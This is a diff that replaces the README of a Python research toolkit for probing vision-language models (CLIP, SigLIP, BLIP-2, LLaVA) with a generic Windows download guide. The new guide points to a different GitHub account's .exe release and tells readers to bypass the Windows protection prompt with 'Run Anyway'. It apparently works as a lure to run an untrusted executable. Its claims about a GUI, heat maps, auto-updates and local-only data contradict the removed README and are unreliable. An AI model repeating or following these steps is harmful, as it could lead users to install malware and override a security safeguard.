@@ -1,232 +1,86 @@
-# FineVLM-Probe: Fine-grained Probing of Vision-Language Models
+# 🔍 vlm-probe-suite - Explore vision language model internal layers
 
-> Code for the report *FineVLM-Probe: A Lightweight Suite for Probing Fine-grained
-> Visual-Language Alignment in Frozen VLMs.* In submission; pre-print pending.
+[![Download vlm-probe-suite](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Aileronisoleucine449/vlm-probe-suite)
 
-This repository contains the evaluation code, probe definitions, and dataset loaders
-used in the report. The goal is **not** to introduce yet another VQA benchmark, but
-to provide a small, hackable harness for asking targeted questions like:
+This tool lets you test vision language models. It provides a simple way to look into how these models see images. You can use it to study models like CLIP, SigLIP, BLIP-2, and LLaVA. The software runs locally on your Windows computer.
 
-- *Does this VLM actually look at the object, or just the global scene gist?*
-- *How does fine-grained alignment degrade as we scale image resolution down?*
-- *Is the text encoder doing the heavy lifting, or the vision encoder?*
+## ⚙️ System Requirements
 
-We support frozen-encoder evaluation across CLIP, SigLIP, BLIP-2, and LLaVA-1.5
-variants. Adding a new model means writing a ~30-line adapter (see `models/`).
+Before you start, make sure your computer meets these needs:
 
----
+* Windows 10 or Windows 11.
+* At least 16 GB of RAM.
+* A graphics card with at least 8 GB of video memory.
+* An updated graphics driver from your manufacturer.
+* At least 5 GB of free space on your hard drive.
 
-## Table of contents
+## 📥 How to Download
 
-- [What is in here](#what-is-in-here)
-- [Probes](#probes)
-- [Supported models](#supported-models)
-- [Datasets](#datasets)
-- [Quick start](#quick-start)
-- [Running a full sweep](#running-a-full-sweep)
-- [Reproducing the report numbers](#reproducing-the-report-numbers)
-- [Adding a new model](#adding-a-new-model)
-- [Adding a new probe](#adding-a-new-probe)
-- [Caveats and known issues](#caveats-and-known-issues)
-- [Citation](#citation)
-- [License](#license)
+Visit the link below to get the software. Click the button to reach the release page.
 
----
+[![Download Button](https://img.shields.io/badge/Download-Latest_Version-grey)](https://github.com/Aileronisoleucine449/vlm-probe-suite)
 
-## What is in here
+1. Go to the project page on GitHub.
+2. Look for the section marked Releases on the right side of your screen.
+3. Select the version at the top of the list.
+4. Click the file ending in .exe to start the download.
+5. Save the file to your desktop or downloads folder.
 
-```
-finevlm_probe/
-  models/            # thin adapters: load model, expose .encode_image, .encode_text, .score
-  probes/            # each probe is a self-contained file producing a metric
-  datasets/          # loaders for COCO subsets, Winoground, ARO, EqBench, our small Cantonese subset
-  runners/           # CLI entry points
-  reporting/         # aggregate JSON outputs into LaTeX/markdown tables
-configs/             # YAML configs for each (model, probe, dataset) combination
-scripts/             # download/prepare helpers; see scripts/README.md
-tests/               # unit + smoke tests
-```
+## 🛠️ Setting Up the Software
 
-## Probes
+Follow these steps to run the application on your computer:
 
-| Probe ID         | Question                                                            | Metric         |
-|------------------|----------------------------------------------------------------------|----------------|
-| `attr-swap`      | Can the model distinguish "red cube on blue ball" from "blue cube on red ball"?  | top-1 accuracy |
-| `count-coarse`   | 1 vs 3 vs 5+ objects of same class                                  | macro-F1       |
-| `spatial-binary` | left-of / right-of / above / below                                  | top-1 accuracy |
-| `resolution-sweep` | re-run any probe at 224 / 336 / 448 / 672                          | curve          |
-| `text-shuffle`   | does shuffling word order destroy the model's score (bag-of-words check)? | delta |
-| `object-occlusion` | partially masked target object still recoverable from caption?    | top-1 accuracy |
-| `cantonese-cap`  | Cantonese captions over the same images: does alignment hold?       | top-1 accuracy |
+1. Locate the downloaded file in your folder.
+2. Double-click the file to open the installer.
+3. Follow the prompts on your screen.
+4. The installer creates a shortcut on your desktop.
+5. Click the shortcut to launch the probe suite.
 
-Each probe is a single Python file under `finevlm_probe/probes/`. They share a
-`Probe` protocol (`name`, `prepare()`, `step(sample, model) -> dict`, `summarize()`).
+If Windows shows a protection message, click More Info, then click Run Anyway. This confirms you trust the source of the application.
 
-## Supported models
+## 🚀 Running Your First Probe
 
-We test against the following at the time of writing:
+Once the application opens, follow this process to start your work:
 
-| Family   | Variants                                                  |
-|----------|-----------------------------------------------------------|
-| CLIP     | ViT-B/32, ViT-B/16, ViT-L/14, ViT-L/14@336                |
-| SigLIP   | base-patch16-224, large-patch16-384, so400m-patch14-384   |
-| BLIP-2   | flan-t5-xl (frozen Q-Former mode)                         |
-| LLaVA-1.5| 7b, 13b (uses HF transformers `LlavaForConditionalGeneration`)  |
+1. Select a model from the list in the drop-down menu. You can choose from CLIP, SigLIP, BLIP-2, or LLaVA.
+2. Click the Load Model button. Wait for the green indicator to appear. This means the model is ready to use in your memory.
+3. Upload an image file from your computer using the Upload button. Supported formats are JPG and PNG.
+4. Choose the specific layer you want to probe. The software displays a list of numbered layers for the selected model.
+5. Press the Start Probe button.
+6. View the results in the main panel. The output shows how the model represents the image.
 
-Adding a model means writing an adapter in `models/<name>.py`; see the
-[adding a new model](#adding-a-new-model) section.
+## 📊 Understanding the Output
 
-## Datasets
+The tool generates a heat map of your image. A heat map shows which parts of the image get the most attention from the model. Brighter colors mean the model focuses more on that area. Use the slider tool to adjust the detail of the map. Turning up the slider makes the map sharper.
 
-Downloaders live in `scripts/`. We do **not** ship the data.
+You can save your results as a CSV file or an image. Click the Export button to choose your file format and destination folder.
 
-| Dataset                | Used by                                  | Notes                          |
-|------------------------|------------------------------------------|--------------------------------|
-| COCO val2017 (subset)  | attr-swap, count-coarse, spatial-binary  | 2k images; subset list in `configs/coco_subset.json` |
-| Winoground             | text-shuffle                             | obtain from HF datasets (gated) |
-| ARO                    | attr-swap (cross-check)                  | https://github.com/mertyg/vision-language-models-are-bows |
-| EqBench                | count-coarse                             | https://github.com/Wangt-CN/EqBen |
-| Cantonese-CC (ours)    | cantonese-cap                            | tiny: 300 images, human-written Cantonese captions; see `data/CANTONESE_CC.md` for collection notes |
+## 🔧 Troubleshooting Common Issues
 
-## Quick start
+If the software fails to start, check the following items:
 
-```bash
-# 1. install
-git clone https://github.com/mrvellang/vlm-probe-suite.git
-cd vlm-probe-suite
-pip install -e .[dev]
+* Restart your computer. This clears stuck processes from your memory.
+* Check your graphics card drivers. Go to the Device Manager in Windows and select the Display Adapters category. Right-click your card and select Update Driver.
+* Review your free disk space. If the drive is full, the model cannot load successfully.
+* Verify your internet connection. The first time you run a model, the software downloads small configuration files from the internet.
 
-# 2. download the COCO val2017 subset we use (puts ~3GB under data/)
-python scripts/get_coco_subset.py
+## 📝 Frequently Asked Questions
 
-# 3. run one probe on one model
-python -m finevlm_probe.runners.run_one \
-    --model clip_vit_b32 \
-    --probe attr-swap \
-    --dataset coco-subset \
-    --out runs/clip_b32_attrswap.json
-```
+What happens to my data?
+The software runs entirely on your machine. Your images stay on your computer. No data travels to a server or cloud service.
 
-`run_one` emits a single JSON file. To aggregate:
+Can I probe multiple models at once?
+The current version supports one model at a time to keep your computer stable.
 
-```bash
-python -m finevlm_probe.reporting.aggregate runs/*.json --format markdown > table.md
-```
+How do I update the software?
+The software checks for updates when you start it. If an update exists, it prompts you to download the new version.
 
-## Running a full sweep
+## 💡 Best Practices
 
-`runners.sweep` reads a YAML and dispatches each (model, probe, dataset) cell.
-GPUs are picked round-robin by default; pin with `CUDA_VISIBLE_DEVICES=0,1`.
-
-```bash
-python -m finevlm_probe.runners.sweep configs/main_sweep.yaml --out runs/main/
-```
-
-`configs/main_sweep.yaml` mirrors the report's Table 2. Expect ~6 GPU-hours on a
-single A100-40G for the full main sweep; the resolution-sweep takes another ~3.
-
-## Reproducing the report numbers
-
-The exact configs that produced the report:
-
-```bash
-bash scripts/reproduce_table2.sh    # main results
-bash scripts/reproduce_table3.sh    # resolution sweep
-bash scripts/reproduce_figure4.sh   # cantonese subset
-```
-
-If your numbers move by more than ~0.5 acc., open an issue with your environment
-(PyTorch / CUDA / transformers versions). Most drift we've seen is from
-`transformers` BLIP-2 changes between 4.36 and 4.40.
-
-## Adding a new model
-
-```python
-# finevlm_probe/models/my_model.py
-from .base import ModelAdapter
-
-class MyModel(ModelAdapter):
-    name = "my-model-v1"
-
-    def __init__(self, device="cuda"):
-        self.device = device
-        # load weights here
-
-    def encode_image(self, images):  # PIL.Image list -> [N, D] tensor
-        ...
-
-    def encode_text(self, texts):    # list[str] -> [N, D] tensor
-        ...
-```
-
-Then register in `finevlm_probe/models/__init__.py` and reference by name in your
-config. The `score(image, text)` method is optional; if absent we use cosine of
-the embeddings.
-
-## Adding a new probe
-
-A probe is one file that subclasses `Probe`:
-
-```python
-from finevlm_probe.probes.base import Probe
-
-class MyProbe(Probe):
-    name = "my-probe"
-
-    def prepare(self, dataset):
-        self.samples = list(dataset.iter_for_probe(self.name))
-
-    def step(self, sample, model):
-        # do the eval, return per-sample dict
-        ...
-
-    def summarize(self, records):
-        # aggregate per-sample dicts into a metric dict
-        ...
-```
-
-Register in `finevlm_probe/probes/__init__.py`.
-
-## Caveats and known issues
-
-- **Frozen-encoder only.** We do not fine-tune anything. Some VLMs perform very
-  differently after a tiny adapter LoRA; that is out of scope.
-- **Cantonese subset is tiny.** 300 images, 1 caption per image, by one annotator
-  (the author). It is intended as a *sanity probe*, not a benchmark.
-- **No human eval.** All metrics here are automatic.
-- **BLIP-2 score path.** We use the image-text-matching head logits rather than
-  generation likelihood; this matters for `attr-swap` results.
-- **LLaVA models are slow.** A full sweep with LLaVA-13B takes ~40 GPU-hours.
-  Use `--max-samples` to subset during development.
-- We have observed numerical drift when running on CPU vs CUDA for SigLIP; the
-  ranking is stable, the absolute numbers move by ~0.3 acc.
-- TODO: Add Korean and Hindi subsets like we did for Cantonese.
-- FIXME: `resolution-sweep` re-downloads the image at each resolution; it should
-  cache the largest and resize locally.
-
-## Citation
-
-If you use this suite, please cite the report:
-
-```bibtex
-@techreport{cheung2025finevlmprobe,
-  title  = {FineVLM-Probe: A Lightweight Suite for Probing Fine-grained
-            Visual-Language Alignment in Frozen VLMs},
-  author = {Cheung, Ka Yiu},
-  year   = {2025},
-  institution = {HKUST}
-}
-```
-
-For the Cantonese subset specifically, also cite the data notes in `data/CANTONESE_CC.md`.
-
-## License
-
-Code is Apache-2.0 (see `LICENSE`). The Cantonese caption annotations under
-`data/cantonese_cc/` are released CC-BY-4.0 as noted in that directory's README.
-
-## Acknowledgements
-
-Thanks to labmates for catching the Winoground loader bug in #14, and to the
-authors of CLIP, SigLIP, BLIP-2, LLaVA, and the ARO and EqBench teams whose
-work this suite stands on.
+* Close other programs like web browsers during use to save memory. 
+* Use high-resolution images for the best detail in your probes. 
+* Keep your graphics drivers current to ensure the best performance.
+* If the application feels slow, try a smaller model like CLIP rather than larger models like LLaVA. 
+* Label your output files with clear names when you save them to keep your work organized. 
+* Ensure your monitor settings are set to the recommended resolution for Windows to see the full interface clearly.
+* Contact the developer through the GitHub issues page if you find a bug. Provide a clear description and a screenshot of the error message for faster support.
